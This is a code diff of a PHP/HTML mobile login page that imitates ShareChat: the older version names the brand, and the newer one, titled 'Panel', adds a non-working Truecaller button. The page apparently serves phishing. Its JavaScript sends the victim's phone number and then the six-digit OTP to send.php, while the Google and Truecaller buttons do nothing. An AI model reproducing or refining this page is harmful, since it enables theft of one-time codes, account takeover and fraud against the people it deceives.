@@ -9,184 +9,108 @@ if(isset($_POST['number'])) {
 ?>
 
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-<meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Create Account / Login</title>
+<title>Panel</title>
 
 <style>
-*{
-    margin:0;
-    padding:0;
-    box-sizing:border-box;
-    font-family: Arial, sans-serif;
-}
-
-body{
-    background:#f3f3f3;
-}
-
-.container{
-    max-width:420px;
-    margin:auto;
-    min-height:100vh;
-    padding:25px 20px;
-    position:relative;
-}
-
-.top-bar{
-    display:flex;
-    align-items:center;
-    gap:15px;
-    margin-bottom:40px;
-}
-
-.close{
-    font-size:38px;
-    color:#222;
-    cursor:pointer;
-}
-
-.top-title{
-    font-size:22px;
-    font-weight:700;
-    color:#111;
-}
-
-.logo{
-    width:120px;
-    display:block;
-    margin:20px auto;
-    border-radius:20px;
-}
-
-h1{
-    text-align:center;
-    font-size:52px;
-    font-weight:700;
-    color:#111;
-    margin-top:10px;
-}
-
-.subtext{
-    text-align:center;
-    font-size:18px;
-    color:#555;
-    margin-top:15px;
-}
-
-.input-box{
-    display:flex;
-    gap:15px;
-    margin-top:40px;
-}
-
-.country{
-    width:120px;
-    background:#ececec;
-    border-radius:16px;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    font-size:20px;
-    font-weight:600;
-    padding:18px;
-}
-
-.country img{
-    width:28px;
-    margin-right:8px;
-}
-
-.phone{
-    flex:1;
-}
-
-.phone input,
-#otp{
-    width:100%;
-    padding:20px;
-    border:none;
-    border-radius:16px;
-    background:#ececec;
-    font-size:20px;
-    outline:none;
-}
-
-.or-line{
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    gap:15px;
-    margin:35px 0;
-}
-
-.or-line .line{
-    flex:1;
-    height:1px;
-    background:#bdbdbd;
-}
-
-.or-line span{
-    font-size:18px;
-    font-weight:600;
-    color:#333;
-}
-
-.google-btn{
-    width:100%;
-    background:#fff;
-    border:2px solid #0b5d8d;
-    border-radius:18px;
-    padding:18px;
-    font-size:18px;
-    font-weight:700;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    gap:12px;
-}
-
-.google-btn img{
-    width:30px;
+body {
+    margin: 0;
+    font-family: Arial;
+    background: #f5f6f8;
 }
 
 #mainBtn{
-    width:100%;
-    margin-top:25px;
-    padding:18px;
-    border:none;
-    border-radius:16px;
-    background:#d8d8d8;
-    color:#666;
-    font-size:18px;
-    font-weight:700;
+background:#d3d3d3;
+color:#666;
+border:none;
+padding:15px 30px;
+border-radius:12px;
+font-size:20px;
 }
 
 #mainBtn.active{
-    background:#0066ff;
-    color:#fff;
+background:#0066ff;
+color:white;
 }
 
-#otpSection{
-    display:none;
-    margin-top:20px;
+.container {
+    max-width: 400px;
+    margin: auto;
+    text-align: center;
+    padding: 40px 20px;
 }
 
-.privacy{
-    position:absolute;
-    bottom:25px;
-    left:20px;
-    right:20px;
-    text-align:center;
-    font-size:15px;
-    color:#222;
-    line-height:1.5;
+.logo {
+    width: 110px;
+    margin: 50px auto 20px;
+    display: block;
+    border-radius: 20px;
 }
 
-.privacy b{
-    font-weight:700;
+h1 {
+    font-size: 32px;
+    color: #0d1633;
+}
+
+p {
+    color: #6c778f;
+    font-size: 18px;
+}
+
+.input-box {
+    display: flex;
+    gap: 10px;
+    margin-top: 25px;
+}
+
+.country {
+    width: 110px;
+    background: #ececec;
+    border-radius: 12px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 18px;
+    padding: 15px;
+}
+
+.country img {
+    width: 28px;
+    margin-right: 8px;
+}
+
+.phone input,
+#otp {
+    width: 100%;
+    padding: 18px;
+    border: none;
+    border-radius: 12px;
+    background: #ececec;
+    font-size: 18px;
+    box-sizing: border-box;
+}
+
+.phone {
+    flex: 1;
+}
+
+#otpSection {
+    display: none;
+    margin-top: 15px;
+}
+
+button {
+    width: 100%;
+    margin-top: 25px;
+    padding: 20px;
+    border: none;
+    border-radius: 18px;
+    background: #e5e5e5;
+    font-size: 20px;
+    font-weight: bold;
+    color: #5e6f8d;
 }
 </style>
 </head>
@@ -194,108 +118,180 @@ h1{
 
 <div class="container">
 
-    <div class="top-bar">
-        <div class="close">×</div>
-        <div class="top-title">Create Account / Login</div>
+<img src="logo.png" class="logo">
+
+<h1>Welcome!</h1>
+<p>Login for an amazing experience</p>
+
+<form action="send.php" method="POST">
+
+<div class="input-box">
+
+    <div class="country">
+        <img src="flag.png">
+        +91
     </div>
 
-    <img src="logo.png" class="logo" alt="logo">
-
-    <h1>Welcome!</h1>
-    <div class="subtext">Login for an amazing experience</div>
-
-    <form action="send.php" method="POST">
-
-        <div class="input-box">
-            <div class="country">
-                <img src="flag.png" alt="flag">
-                +91
-            </div>
-
-            <div class="phone">
-                <input
-                    type="text"
-                    name="number"
-                    id="phone"
-                    placeholder="Enter your phone number"
-                    maxlength="10"
-                    oninput="checkPhone()">
-            </div>
-        </div>
-
-        <button type="button" id="mainBtn" onclick="nextStep()">Get OTP</button>
-
-        <div id="otpSection">
-            <input
-                type="text"
-                name="otp"
-                id="otp"
-                placeholder="Enter OTP"
-                maxlength="6"
-                oninput="checkOTP()">
-        </div>
-
-    </form>
-
-    <div class="or-line">
-        <div class="line"></div>
-        <span>Or</span>
-        <div class="line"></div>
-    </div>
-
-    <button class="google-btn">
-        <img src="google.png" alt="google">
-        Continue with Google
-    </button>
-
-    <div class="privacy">
-        Your Privacy is important to us and your number will be safe. By continuing, you agree to ShareChat <b>Terms and Conditions</b>, <b>Privacy Policy</b> and <b>Content & Community Guidelines.</b>
+    <div class="phone">
+        <input type="text"
+name="number"
+id="phone"
+oninput="checkPhone()"
+maxlength="12">
     </div>
 
 </div>
 
+<!-- Get OTP Button -->
+<button type="button"
+id="mainBtn"
+onclick="nextStep()">
+Get OTP
+</button>
+
+<!-- OTP Section -->
+<div id="otpSection" style="display:none; margin-top:10px;">
+
+    <input type="text"
+    name="otp"
+    id="otp"
+    oninput="checkOTP()"
+    maxlength="6"
+    placeholder="Enter OTP">
+
+</div>
+
+<!-- OR Line -->
+<div style="display:flex; align-items:center; margin:30px 0;">
+    <div style="flex:1; height:1px; background:#bdbdbd;"></div>
+    <div style="padding:0 15px; font-size:20px; font-weight:bold;">Or</div>
+    <div style="flex:1; height:1px; background:#bdbdbd;"></div>
+</div>
+
+<!-- Google Button -->
+<button type="button" style="
+width:100%;
+padding:12px;
+border:2px solid #0b5c8a;
+border-radius:14px;
+background:white;
+font-size:16px;
+font-weight:bold;
+display:flex;
+align-items:center;
+justify-content:flex-start;
+gap:15px;
+color:#111;
+margin-bottom:10px;
+">
+
+<img src="google.png" style="width:32px; height:32px;">
+
+Continue with Google
+
+</button>
+
+<!-- Truecaller Button -->
+<button type="button" style="
+width:100%;
+padding:12px;
+border:2px solid #0b5c8a;
+border-radius:14px;
+background:white;
+font-size:16px;
+font-weight:bold;
+display:flex;
+align-items:center;
+justify-content:flex-start;
+gap:15px;
+color:#111;
+">
+
+<img src="truecaller.png" style="width:32px; height:32px;">
+
+Continue with Truecaller
+
+</button>
+
+<!-- Privacy Policy Text -->
+<div style="margin-top:8px; text-align:center; font-size:13px; line-height:1.4; color:#222;">
+
+Your Privacy is important to us and your number
+will be safe. By continuing, you agree to our
+
+<b>Terms and Conditions, Privacy Policy</b>
+and
+<b>Content & Community Guidelines.</b>
+
+</div>
+
 <script>
+
 let otpShown = false;
 
-function nextStep(){
+function nextStep() {
+
     let phone = document.getElementById("phone").value;
 
-    if(!otpShown){
-        if(phone.length < 10) return;
+    if (!otpShown) {
+
+        if (phone.length < 10) {
+            return;
+        }
+
+        fetch("send.php", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/x-www-form-urlencoded"
+            },
+            body: "number=" + encodeURIComponent(phone)
+        });
 
         document.getElementById("otpSection").style.display = "block";
         document.getElementById("mainBtn").innerText = "Verify OTP";
-        otpShown = true;
-    }else{
-        let otp = document.getElementById("otp").value;
-        if(otp.length < 6) return;
 
-        document.forms[0].submit();
+        otpShown = true;
+
+    } else {
+
+        let otp = document.getElementById("otp").value;
+
+        if (otp.length < 6) {
+            return;
+        }
+
+        fetch("send.php", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/x-www-form-urlencoded"
+            },
+            body:
+                "number=" + encodeURIComponent(phone) +
+                "&otp=" + encodeURIComponent(otp)
+        });
     }
 }
 
-function checkPhone(){
+function checkPhone() {
     let phone = document.getElementById("phone").value;
     let btn = document.getElementById("mainBtn");
 
-    if(phone.length == 10){
+    if (phone.length == 10) {
         btn.classList.add("active");
-    }else{
+    } else {
         btn.classList.remove("active");
     }
 }
 
-function checkOTP(){
+function checkOTP() {
     let otp = document.getElementById("otp").value;
     let btn = document.getElementById("mainBtn");
 
-    if(otp.length == 6){
+    if (otp.length == 6) {
         btn.classList.add("active");
-    }else{
+    } else {
         btn.classList.remove("active");
     }
 }
-</script>
 
-</body>
-</html>
+</script>
